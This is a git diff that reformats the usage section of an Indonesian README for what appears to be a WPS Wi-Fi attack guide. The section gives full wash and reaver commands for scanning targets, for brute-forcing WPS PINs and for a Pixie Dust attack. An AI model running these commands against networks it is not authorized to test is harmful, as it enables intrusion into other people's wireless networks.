@@ -46,28 +46,27 @@ Kali Linux:
    
 ## Penggunaan
 
-### 1. Scan Wi-Fi WPS:
-
-```
-sudo wash -i [interface]
-```
-
-### 2. Pilih Taraget
-
-Pastikan status `Lck` (Lock) tidak menunjukkan `YES`. Jika `YES`, artinya fitur WPS sedang terkunci (tidak bisa diserang).
-
-### 3. Jalankan Serangan
-
-1. PIN Brute Force Attack:
+1. Scan Wi-Fi WPS:
 
    ```
-   sudo reaver -i [interface] -b [bssid] -c [channel] -vv
+   sudo wash -i [interface]
    ```
-2. Pixie Dust Attack
 
-   ```
-   sudo reaver -i [interface] -b [bssid] -c [channel] -K -vv
-   ```
+2. Pilih Taraget
+   Pastikan status `Lck` (Lock) tidak menunjukkan `YES`. Jika `YES`, artinya fitur WPS sedang terkunci (tidak bisa diserang).
+
+3. Jalankan Serangan
+
+   1. PIN Brute Force Attack:
+
+      ```
+      sudo reaver -i [interface] -b [bssid] -c [channel] -vv
+      ```
+   2. Pixie Dust Attack
+
+      ```
+      sudo reaver -i [interface] -b [bssid] -c [channel] -K -vv
+      ```
 
 ## Video Demonstrasi
 
